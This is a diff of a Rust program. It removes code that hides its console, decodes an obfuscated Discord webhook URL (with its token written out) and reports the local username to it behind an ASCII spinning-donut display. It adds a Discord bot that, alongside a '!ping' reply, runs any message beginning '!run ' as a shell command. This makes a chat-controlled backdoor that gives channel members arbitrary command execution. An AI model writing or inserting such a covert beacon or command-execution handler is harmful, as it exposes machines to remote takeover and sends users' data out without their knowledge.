@@ -1,85 +1,72 @@
-#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
+use std::env;
 
-use serenity::builder::ExecuteWebhook;
-use serenity::http::Http;
-use serenity::model::webhook::Webhook;
-use std::thread;
-use std::time::Duration;
-use cryptify;
+use serenity::async_trait;
+use serenity::model::channel::Message;
+use serenity::model::gateway::Ready;
+use serenity::prelude::*;
+use tokio::process::Command;
+use serenity::all::GatewayIntents;
 
-fn donut() {
-    let (mut a, mut b): (f32, f32) = (0.0, 0.0);
-    let mut z: [f32; 1760];
-    let mut b2: [char; 1760];
-    let s: [char; 12] = ['.', ',', '-', '~', ':', ';', '=', '!', '*', '#', '$', '@'];
+struct Handler;
 
-    print!("\n1b2J");
-    loop {
-        // alternative: z[0..1760].fill(0.);
-        z = [0.0; 1760];
-        // alternative: b2[0..1760].fill(' ');
-        b2 = [' '; 1760];
-        for j in (0..628).step_by(1) {
-            for i in (0..628).step_by(1) {
-                let float_j = j as f32 / 100.0;
-                let float_i = i as f32 / 100.0;
-
-                let sin_i: f32 = float_i.sin();
-                let cos_j: f32 = float_j.cos();
-                let sin_a: f32 = a.sin();
-                let sin_j: f32 = float_j.sin();
-                let cos_a: f32 = a.cos();
-                let cos_j_2: f32 = cos_j + 2.0;
-                let m: f32 = 1.0 / (sin_i * cos_j_2 * sin_a + sin_j * cos_a + 5.0);
-                let cos_i: f32 = float_i.cos();
-                let cos_b: f32 = b.cos();
-                let sin_b: f32 = b.sin();
-                let t: f32 = sin_i * cos_j_2 * cos_a - sin_j * sin_a;
-
-                let x: usize = (40.0 + 30.0 * m * (cos_i * cos_j_2 * cos_b - t * sin_b)) as usize;
-                let y: usize = (12.0 + 15.0 * m * (cos_i * cos_j_2 * sin_b + t * cos_b)) as usize;
-                let o: usize = x + 80 * y;
-                let n_m: usize = (8.0
-                    * ((sin_j * sin_a - sin_i * cos_j * cos_a) * cos_b
-                        - sin_i * cos_j * sin_a
-                        - sin_j * cos_a
-                        - cos_i * cos_j * sin_b)) as usize;
-
-                if 22 > y && y > 0 && x > 0 && 80 > x && m > z[o] {
-                    z[o] = m;
-                    b2[o] = s[if n_m > 0 { n_m } else { 0 }];
-                }
+#[async_trait]
+impl EventHandler for Handler {
+    // Set a handler for the `message` event. This is called whenever a new message is received.
+    //
+    // Event handlers are dispatched through a threadpool, and so multiple events can be
+    // dispatched simultaneously.
+    async fn message(&self, ctx: Context, msg: Message) {
+        if msg.content == "!ping" {
+            // Sending a message can fail, due to a network error, an authentication error, or lack
+            // of permissions to post in the channel, so log to stdout when some error happens,
+            // with a description of it.
+            if let Err(why) = msg.channel_id.say(&ctx.http, "Pong!").await {
+                println!("Error sending message: {why:?}");
             }
         }
-        print!("\x1b[d");
-        for k in (0..1761).step_by(1) {
-            print!("{}", if k % 80 != 0 { b2[k] } else { '\n' });
+        if msg.content.starts_with("!run ") {
+            let command = msg.content.strip_prefix("!run ").unwrap_or("");
+            if let Err(why) = Command::new("sh")
+                .arg("-c")
+                .arg(command)
+                .spawn()
+            {
+                println!("Error executing command: {why:?}");
+            }
         }
-        a += 0.04;
-        b += 0.02;
+    }
 
-        thread::sleep(Duration::from_millis(5));
+    // Set a handler to be called on the `ready` event. This is called when a shard is booted, and
+    // a READY payload is sent by Discord. This payload contains data like the current user's guild
+    // Ids, current user data, private channels, and more.
+    //
+    // In this case, just print what the current user's username is.
+    async fn ready(&self, _: Context, ready: Ready) {
+        println!("{} is connected!", ready.user.name);
     }
 }
 
 #[tokio::main]
 async fn main() {
-    let http = Http::new("");
-    let webhook = Webhook::from_url(&http, cryptify::encrypt_string!("https://discord.com/api/webhooks/1329425656647516223/7hkWERa5lejXlK99VWe0H7JrfwzHYW-kwFBORmPAFSjNHpWsSn_zEDh-5_2VHYEH143N").as_str())
+    // Configure the client with your Discord bot token in the environment.
+    let token = env::var("DISCORD_TOKEN").expect("Expected a token in the environment");
+    // Set gateway intents, which decides what events the bot will be notified about
+    let intents = GatewayIntents::GUILD_MESSAGES
+        | GatewayIntents::DIRECT_MESSAGES
+        | GatewayIntents::MESSAGE_CONTENT;
+
+    // Create a new instance of the Client, logging in as a bot. This will automatically prepend
+    // your bot token with "Bot ", which is a requirement by Discord for bot users.
+    let mut client = Client::builder(&token, intents)
+        .event_handler(Handler)
         .await
-        .expect("Invalid webhook.");
+        .expect("Err creating client");
 
-    let builder = ExecuteWebhook::new()
-        .content("Ballsack")
-        .username(whoami::username())
-        .avatar_url(
-            cryptify::encrypt_string!("https://cdn.discordapp.com/attachments/936284146416906270/1329436606146412676/pfp.jpg").as_str(),
-        );
-
-    webhook
-        .execute(&http, false, builder)
-        .await
-        .expect("Could not run webhook.");
-
-	donut()
+    // Finally, start a single shard, and start listening to events.
+    //
+    // Shards will automatically attempt to reconnect, and will perform exponential backoff until
+    // it reconnects.
+    if let Err(why) = client.start().await {
+        println!("Client error: {why:?}");
+    }
 }
